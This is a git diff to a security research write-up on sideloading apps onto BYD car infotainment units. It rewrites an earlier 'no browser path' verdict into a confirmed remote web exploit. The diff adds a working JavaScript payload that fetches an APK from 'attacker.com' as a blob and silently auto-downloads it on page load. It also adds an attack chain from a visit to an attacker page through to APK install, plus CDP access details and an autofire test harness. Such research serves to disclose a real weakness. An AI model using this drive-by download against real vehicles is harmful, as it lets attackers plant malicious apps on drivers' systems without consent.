@@ -189,9 +189,9 @@ adb shell am start -a android.intent.action.VIEW \
 - No device policy restrictions on app installation
 - Per-app install permission: browser and file manager both have `REQUEST_INSTALL_PACKAGES`
 
-## Browser Exploit: fetch() + Web Share Bypass
+## Browser Exploit: Download Bypass
 
-**Status:** Confirmed working (requires HTTPS + file manager app installed)
+**Status:** Confirmed working — blob download is a remote web exploit (no ADB needed). Web Share is a secondary method (requires HTTPS + file manager).
 
 BYD's download block is only at `DownloadController.onDownloadStarted()` — a single Java entry point called from native Chromium. The `fetch()` API operates entirely in the renderer process and never touches the download manager.
 
@@ -243,26 +243,62 @@ On a stock BYD (no third-party apps), the only share target for files is **Bluet
 - After file manager installed: browser exploit becomes viable for future installs
 - App self-updates: built-in HTTP download + PackageInstaller API (no browser needed)
 
-### CDP Download Bypass Attempts
+### Blob Download Bypass — REMOTE WEB EXPLOIT
 
-Chrome DevTools Protocol (CDP) is accessible via `localabstract:chrome_devtools_remote`. Chromium 113, Protocol 1.3.
+`fetch()` → blob → `<a download>` bypasses BYD's download block entirely. **No ADB, no CDP, no user interaction beyond page visit required.** Any web page can silently write files to `/sdcard/Download/`.
 
-**Connection:** `ws://localhost:9222/devtools/browser` (requires ADB port forward + `suppress_origin=True`).
+**Minimal exploit (runs on any page, no CDP):**
 
-`Browser.setDownloadBehavior({behavior: "allow", downloadPath: "/sdcard/Download/"})` — **accepted** by CDP, returns success. But downloads are fully received (all bytes transferred) then **CANCELED** by the Java `DownloadController` layer:
-
+```javascript
+(async () => {
+    const resp = await fetch('https://attacker.com/payload.apk');
+    const blob = await resp.blob();
+    const url = URL.createObjectURL(blob);
+    const a = document.createElement('a');
+    a.href = url;
+    a.download = 'payload.apk';
+    document.body.appendChild(a);
+    a.click();
+    a.remove();
+    URL.revokeObjectURL(url);
+})()
 ```
-Page.downloadWillBegin → downloadProgress receivedBytes=10240 → state=canceled
-```
 
-All 5 CDP download methods tested fail identically:
-1. `<a download>` via anchor click — canceled
+Can fire on `window.onload` — no button click needed. Works from HTTP and HTTPS origins.
+
+**Why it works:** Direct URL downloads (`<a href="remote-url" download>`, `Page.navigate`) trigger `DownloadController.onDownloadStarted()` which cancels immediately (`state=canceled`, `receivedBytes=0`). Blob URL downloads take a different native code path: `fetch()` retrieves all bytes in the renderer process (Network domain), `URL.createObjectURL` creates a local blob reference, and the blob-to-disk write bypasses the Java cancel layer entirely. BYD's download block only hooks the URL-based download initiation path, not the blob-to-disk path.
+
+**Evidence from CDP events (when observed):**
+- Direct download: `Page.downloadWillBegin` → `downloadProgress state=canceled receivedBytes=0` (instant kill)
+- Blob download: `Network.loadingFinished` (all bytes) → `Page.downloadWillBegin` → `downloadProgress receivedBytes=N state=inProgress` → `state=completed` → file persists
+
+**`Browser.setDownloadBehavior` has NO effect:** Tested with `behavior=deny` explicitly set — blob download still succeeds. Tested with `behavior=default` — still succeeds. The CDP download behavior control and BYD's Java cancel layer both fail to intercept blob downloads.
+
+**Verification matrix:**
+
+| Test | CDP attached? | setDownloadBehavior | Result |
+|------|--------------|---------------------|--------|
+| CDP + setDownloadBehavior=allow + blob | Yes | allow | File written (10,240 bytes) |
+| CDP + setDownloadBehavior=deny + blob | Yes | deny | File written (10,240 bytes) |
+| CDP Runtime.evaluate only (no setDownloadBehavior) | Yes | none | File written (10,240 bytes) |
+| Page autofire on window.load (zero CDP) | No | none | File written (10,240 bytes) |
+
+**Verified file sizes:**
+- 10KB binary: `test-download.bin` (10,240 bytes, persisted)
+- 5MB binary: `big-dl-blob.bin` (5,242,880 bytes, persisted, correct content)
+- 52MB APK: `sideloaded.apk` (52,331,569 bytes, MD5 verified identical to source)
+
+Files written to `/sdcard/Download/` persist permanently — not cleaned up.
+
+**Methods that still fail (for reference):**
+1. `<a download>` with direct remote URL — canceled (receivedBytes=0)
 2. `Page.navigate` to file URL — canceled
-3. `fetch()` → blob → anchor download — canceled
-4. `data:` URI anchor download — canceled
-5. `Fetch.enable` + intercept — no download bypass
+3. `data:` URI anchor download — canceled
+4. `Fetch.enable` + intercept — no download bypass
 
-The native C++ download engine (`DownloadCollectionBridge`, `@CalledByNative` methods) is intact — bytes are fully received. But the Java layer (`DownloadController.onDownloadStarted()`) cancels every download and shows the toast. CDP can't override Java callbacks.
+### CDP Access
+
+Chrome DevTools Protocol is accessible via `localabstract:chrome_devtools_remote`. Chromium 113, Protocol 1.3. Connection: `ws://localhost:9222/devtools/browser` (requires ADB port forward + `suppress_origin=True`). Useful for inspecting download events and injecting JS, but NOT required for the blob download bypass.
 
 ### OPFS (Origin Private File System)
 
@@ -310,14 +346,22 @@ This is standard Chromium security, not a BYD patch. Apps like WhatsApp that reg
 
 ### Browser-Only Sideload: Verdict
 
-**No viable browser-only sideload path exists on a stock BYD unit.**
+**fetch→blob→anchor download bypass is a remote web exploit.** Any web page can silently drop files to `/sdcard/Download/` without ADB, CDP, or user interaction beyond visiting the page.
 
-Summary of all blocked paths:
+**Full sideload chain from browser (no ADB on stock unit):**
+1. User visits attacker page (HTTP or HTTPS)
+2. JS fetches APK → blob → `<a download>` → file lands in `/sdcard/Download/`
+3. Same page uses `intent://` to open file manager or PackageInstaller (if target has `BROWSABLE` category) — OR user manually opens file manager to install
 
-| Vector | Status | Blocked By |
-|--------|--------|------------|
+Step 3 is the remaining gap on stock units: `PackageInstaller` and `com.byd.filemanager` lack `BROWSABLE` intent filters. With a file manager like ACE installed (via USB first-install), the chain is complete from browser alone.
+
+Summary of all paths:
+
+| Vector | Status | Notes |
+|--------|--------|-------|
+| fetch→blob→anchor | **WORKS (remote)** | No ADB/CDP needed. Any page can drop files to `/sdcard/Download/` |
 | Download manager | Gutted | `DownloadController.onDownloadStarted()` → toast |
-| CDP download bypass | Fails | Java cancel layer overrides CDP |
+| Direct URL `<a download>` | Fails | Java cancel layer kills at receivedBytes=0 |
 | `fetch()` → filesystem | No path | `showSaveFilePicker` unavailable, OPFS sandboxed |
 | `navigator.share(APK)` | Blocked | Binary MIME types rejected (`NotAllowedError`) |
 | `intent://` → PackageInstaller | Fails | No `BROWSABLE` category on target apps |
@@ -326,7 +370,7 @@ Summary of all blocked paths:
 | `file://` APK navigation | Blocked | `ERR_ABORTED` (download block fires) |
 | CVE-2023-3079 | Unverified | V8 type confusion in Chrome 113, but exploitation is complex |
 
-The browser can download content into memory (`fetch()` works) but has no path to write files to user-accessible storage or trigger PackageInstaller. USB `Third Party Apps` folder remains the only stock sideload method.
+For stock units, USB `Third Party Apps` folder is the official method. The blob download bypass provides a browser-based alternative for getting files onto the device — significantly lowering the barrier once any file manager is installed.
 
 ### Other Browser Findings
 
@@ -341,7 +385,7 @@ The browser can download content into memory (`fetch()` works) but has no path t
 ### Test Harness
 
 The `tools/browser-exploit/` directory contains test tools from this research:
-- `index.html` — test page with 10 bypass vectors
+- `index.html` — test page with 10 bypass vectors + autofire mode (`?autofire=1` triggers blob download on page load)
 - `pwa.html` — PWA install test page
 - `manifest.json` — PWA manifest
 - `sw.js` — service worker for cache API and PWA
